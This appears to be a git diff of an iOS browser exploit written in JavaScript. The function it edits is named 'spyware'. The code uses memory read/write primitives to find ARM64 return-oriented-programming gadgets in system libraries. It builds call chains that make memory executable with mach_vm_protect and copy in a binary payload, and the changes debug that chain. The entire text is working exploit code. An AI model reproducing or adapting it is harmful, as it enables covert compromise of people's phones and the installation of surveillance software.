@@ -117,6 +117,7 @@ function _writeInt64(i, val)
 
 function spyware(stage1, memory, binary)
 {
+    //alert('spyware')
     var wrapper = document.createElement("div")
     var wrapper_addr = stage1.addrof(wrapper)
 
@@ -233,17 +234,20 @@ function spyware(stage1, memory, binary)
             "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
             // mov x3, x22 ; mov x6, x27 ; mov x0, x24 ; mov x1, x19 ; mov x2, x23 ; ldr x4, [sp] ; blr x8
             "regloader":   [ 0xaa1603e3, 0xaa1b03e6, 0xaa1803e0, 0xaa1303e1, 0xaa1703e2, 0xf94003e4, 0xd63f0100 ],
-            // mov x4, x20 ; blr x8
-            "movx4":       [ 0xaa1403e4, 0xd63f0100 ],
             // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
             // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
             "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
+            // mov x4, x20 ; blr x8
+            "movx4":       [ 0xaa1403e4, 0xd63f0100 ],
+            // ldr x0, [x0] -- for debugging
+            "ldrx0x0":     [ 0xf9400000 ],
         }
         opcode_libs = [
             "/usr/lib/PN548.dylib",     // dispatch, stackloader
-            "/usr/lib/libc++.1.dylib",  // ldrx8, regloader, stackloader
+            "/usr/lib/libc++.1.dylib",  // ldrx8, regloader, movx4, stackloader
         ];
     }
+    //alert('lookin through cache');
 
     var syms = {};
     var gadgets = {};
@@ -359,6 +363,7 @@ function spyware(stage1, memory, binary)
         }
     }
 
+    //alert('all gadgets found')
     var longjmp             = syms["__longjmp"];
     var regloader           = gadgets["regloader"];
     var dispatch            = gadgets["dispatch"];
@@ -527,7 +532,8 @@ function spyware(stage1, memory, binary)
     }
 
     var add_call_via_x8 = function(func, x0, x1, x2, x3, x4, jump_to) {
-        alert(`add_call_via_x8: ${func}(${x0}, ${x1}, ${x2}, ${x3}, ${x4}, ${jump_to})`);
+        //alert(`add_call_via_x8: ${func}(${x0}, ${x1}, ${x2}, ${x3}, ${x4}, ${jump_to})`);
+        //x4 = x4 || Int64.One
         // in stackloader:
         arr[pos++] = 0xdead0010;                // unused
         arr[pos++] = 0xdead0011;                // unused
@@ -579,9 +585,12 @@ function spyware(stage1, memory, binary)
 
         // in regloader
         // NOTE: REGLOADER DOES NOT ADJUST SP!
-        // expected value, and i have no fucking idea why
-        //arr[pos++] = 0xdeaded01 // x4 (should be -- but see lines above)
-        //arr[pos++] = 0xdeaded02 // x4 (should be -- but see lines above)
+        // sometimes i didn't get expected value in x4
+        // and i have no fucking idea why
+        // usleep likely did the trick, but I would still keep the code
+        // with movx4
+        //arr[pos++] = x4.lo()                    // x4 (should be -- but see lines above)
+        //arr[pos++] = x4.hi()                    // x4 (should be -- but see lines above)
 
         if (x4) {
             // in stackloader:
@@ -595,14 +604,14 @@ function spyware(stage1, memory, binary)
             arr[pos++] = 0xdaad0015;                // x27 == x6 (unused)
             arr[pos++] = 0xdaad0016;                // x26 (unused)
             arr[pos++] = 0xdaad0017;                // x26 (unused)
-            arr[pos++] = 0xdaad0018;                // x25 == x3 (arg4)
-            arr[pos++] = 0xdaad0019;                // x25 == x3 (arg4)
-            arr[pos++] = 0xdaad00f0;                // x24 == x0 (arg1)
-            arr[pos++] = 0xdaad00f1;                // x24 == x0 (arg1)
-            arr[pos++] = 0xdaad00f2;                // x23 == x2 (arg3)
-            arr[pos++] = 0xdaad00f3;                // x23 == x2 (arg3)
-            arr[pos++] = 0xdaad00f4;                // x22 == x3 (arg4)
-            arr[pos++] = 0xdaad00f5;                // x22 == x3 (arg4)
+            arr[pos++] = 0xdaad0018;                // x25 (unused)
+            arr[pos++] = 0xdaad0019;                // x25 (unused)
+            arr[pos++] = 0xdaad00f0;                // x24 (unused)
+            arr[pos++] = 0xdaad00f1;                // x24 (unused)
+            arr[pos++] = 0xdaad00f2;                // x23 (unused)
+            arr[pos++] = 0xdaad00f3;                // x23 (unused)
+            arr[pos++] = 0xdaad00f4;                // x22 (unused)
+            arr[pos++] = 0xdaad00f5;                // x22 (unused)
             arr[pos++] = func.lo();                 // x21 (target for dispatch)
             arr[pos++] = func.hi();                 // x21 (target for dispatch)
             arr[pos++] = 0xdaad0018;                // x20 (unused)
@@ -663,16 +672,7 @@ function spyware(stage1, memory, binary)
         )
     }
 
-    add_call(mach_vm_protect);
-
-    add_call(new Int64(0x1204),
-        new Int64(0xcafe000fbabe000c),
-        new Int64(0xcafe010fbabe010c),
-        new Int64(0xcafe020fbabe010c),
-        new Int64(0xcafe030fbabe010c)
-//        new Int64(0xcafe040fbabe010c)
-    );
-
+    // FIXME(stek): returns '(os/kern) protection failure' on ios 11.2?
     add_call(mach_vm_protect,
         // mach_task_self_,    // task
         // codeAddr,           // addr
@@ -681,8 +681,10 @@ function spyware(stage1, memory, binary)
         new Int64(0xdeadbee1),
         new Int64(0xdeadbee3),
         new Int64(0),       // max flag
-        new Int64(7),       // prot,
-        0
+        new Int64(7)        // prot
+
+        // for debugging return value
+        //, gadgets["ldrx0x0"]
     );
 
     add_call(memmove,
